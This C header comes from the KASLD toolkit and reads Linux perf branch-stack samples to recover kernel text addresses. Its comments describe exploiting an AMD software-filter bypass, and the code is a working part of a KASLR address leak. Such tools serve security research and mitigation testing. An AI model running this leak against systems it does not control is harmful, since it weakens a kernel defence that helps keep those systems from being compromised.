// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Shared branch-record ring reader for the perf branch-stack leak components.
// Two components split this: perf_lbr_sampling.c uses the INTENDED
// PERF_SAMPLE_BRANCH_KERNEL capability (perfmon-gated), and
// perf_amd_branch_user.c exploits the AMD software-filter bypass via
// PERF_SAMPLE_BRANCH_USER. They differ only in the perf_event_attr they open
// (branch_sample_type, exclude_user, the event) and in which endpoint they keep
// (both from/to vs branch-from only); the ring-drain and address extraction are
// identical, and live here.
//
// The caller opens the event (its own attr) and owns the fd and the sampled
// child; this reader mmaps the fd's ring, enables it, drains up to
// `target_samples` records delivering every sampled address to a callback, then
// disables and unmaps. It never touches the fd or the child.
// ---
// <bcoles@gmail.com>

#ifndef KASLD_PERF_BRANCH_H
#define KASLD_PERF_BRANCH_H

#include "api.h"
#include "cli.h"

#include <linux/perf_event.h>
#include <poll.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

/* Multi-page data ring: power-of-2 pages plus the metadata page. A branch
 * sample is ~408 bytes (header + IP + bnr + depth × 24); 16 pages (~64 KB) hold
 * ~150 samples before wrap. */
#define KASLD_PERF_DATA_PAGES 16
/* Samples to collect before stopping. */
#define KASLD_PERF_TARGET_SAMPLES 50
/* Maximum branch-stack depth on any current CPU (AMD Zen 4: 32). */
#define KASLD_PERF_MAX_LBR_DEPTH 128
/* Maximum on-stack record buffer: header + IP + bnr + depth × 24. */
#define KASLD_PERF_MAX_RECORD (32 + (size_t)KASLD_PERF_MAX_LBR_DEPTH * 24)

static inline long kasld_perf_event_open(struct perf_event_attr *attr,
                                         pid_t pid, int cpu, int group_fd,
                                         unsigned long flags) {
  return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* Which endpoint of a sampled branch record an address came from. */
enum kasld_perf_br { KASLD_PERF_IP, KASLD_PERF_FROM, KASLD_PERF_TO };

typedef void (*kasld_perf_br_cb)(unsigned long addr, enum kasld_perf_br kind,
                                 void *ctx);

/* perf_branch_entry: 24 bytes, { __u64 from; __u64 to; __u64 flags_bitfield }.
 * Only from/to are needed as addresses. */
struct __attribute__((packed)) kasld_lbr_entry {
  uint64_t from;
  uint64_t to;
  uint64_t flags;
};

/* Copy `n` bytes out of the ring at byte offset `off`, handling wrap. */
static inline void kasld_ring_copy(const char *ring, size_t ring_size,
                                   uint64_t off, void *dst, size_t n) {
  size_t off_in = (size_t)(off % ring_size);
  size_t first = ring_size - off_in;
  if (first >= n) {
    memcpy(dst, ring + off_in, n);
  } else {
    memcpy(dst, ring + off_in, first);
    memcpy((char *)dst + first, ring, n - first);
  }
}

/* Drain the perf ring on `fd`, delivering the sample IP and every branch-stack
 * from/to to `cb`. mmaps and enables the event, polls until `target_samples`
 * records are seen or a 1 s wait times out, then disables and unmaps. Returns
 * the number of samples read, or -1 on mmap/enable failure (the caller still
 * owns fd and the sampled child). */
static inline int kasld_perf_branch_collect(int fd, long page_size,
                                            int target_samples,
                                            kasld_perf_br_cb cb, void *ctx) {
  size_t ring_size = (size_t)page_size * KASLD_PERF_DATA_PAGES;
  size_t map_size = (size_t)page_size + ring_size;

  void *map = mmap(NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED)
    return -1;
  if (ioctl(fd, PERF_EVENT_IOC_ENABLE, 0) < 0) {
    munmap(map, map_size);
    return -1;
  }

  struct perf_event_mmap_page *meta = map;
  const char *ring = (const char *)map + page_size;
  int n_samples = 0;

  struct pollfd pfd = {.fd = fd, .events = POLLIN};
  while (n_samples < target_samples) {
    if (poll(&pfd, 1, 1000) <= 0)
      break;

    /* Volatile read + explicit ACQUIRE fence rather than __atomic_load_n on
     * u64: 32-bit musl lacks the __atomic_load_8 libcall the latter compiles
     * to. (Branch sampling is x86_64-only at compile time, so the 32-bit path
     * is not exercised — kept for portability with the sibling perf files.) */
    uint64_t head = *(volatile __u64 *)&meta->data_head;
    __atomic_thread_fence(__ATOMIC_ACQUIRE);
    uint64_t tail = meta->data_tail;

    while (tail < head) {
      struct perf_event_header header;
      if (head - tail < sizeof(header))
        break;
      kasld_ring_copy(ring, ring_size, tail, &header, sizeof(header));
      if (header.size < sizeof(header) || header.size > KASLD_PERF_MAX_RECORD)
        break;
      if (head - tail < header.size)
        break;

      if (header.type == PERF_RECORD_SAMPLE) {
        char buf[KASLD_PERF_MAX_RECORD];
        kasld_ring_copy(ring, ring_size, tail, buf, header.size);

        size_t off = sizeof(header);
        /* PERF_SAMPLE_IP — 8 bytes. */
        if (off + 8 > header.size)
          goto skip;
        uint64_t ip;
        memcpy(&ip, buf + off, 8);
        off += 8;
        cb((unsigned long)ip, KASLD_PERF_IP, ctx);

        /* PERF_SAMPLE_BRANCH_STACK — { u64 nr, struct perf_branch_entry[] }. */
        if (off + 8 > header.size)
          goto skip;
        uint64_t bnr;
        memcpy(&bnr, buf + off, 8);
        off += 8;
        if (bnr > KASLD_PERF_MAX_LBR_DEPTH)
          goto skip;
        for (uint64_t i = 0; i < bnr; i++) {
          if (off + sizeof(struct kasld_lbr_entry) > header.size)
            break;
          struct kasld_lbr_entry e;
          memcpy(&e, buf + off, sizeof(e));
          off += sizeof(e);
          cb((unsigned long)e.from, KASLD_PERF_FROM, ctx);
          cb((unsigned long)e.to, KASLD_PERF_TO, ctx);
        }

        n_samples++;
      }
    skip:
      tail += header.size;
    }

    __atomic_thread_fence(__ATOMIC_RELEASE);
    *(volatile __u64 *)&meta->data_tail = tail;
  }

  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  munmap(map, map_size);
  return n_samples;
}

/* Ready-made sink: track the lowest kernel-text address seen. `from_only`
 * restricts to branch-from endpoints (the AMD leak: only branch-from carries a
 * kernel address under a BRANCH_USER request). Interior kernel-text samples
 * bound the image base from above; the lowest is the tightest ceiling. */
struct kasld_perf_min {
  unsigned long min_addr; /* init to ~0UL */
  unsigned long n;        /* count of kernel-text addresses seen */
  int from_only;
  int verbose;
};

static inline void kasld_perf_min_cb(unsigned long a, enum kasld_perf_br kind,
                                     void *ctx) {
  struct kasld_perf_min *m = (struct kasld_perf_min *)ctx;
  if (m->from_only && kind != KASLD_PERF_FROM)
    return;
  if (a < (unsigned long)KERNEL_VIRT_TEXT_MIN ||
      a > (unsigned long)KERNEL_VIRT_TEXT_MAX)
    return;
  m->n++;
  if (a < m->min_addr)
    m->min_addr = a;
  if (m->verbose)
    kasld_debug("0x%lx", a);
}

#endif /* KASLD_PERF_BRANCH_H */
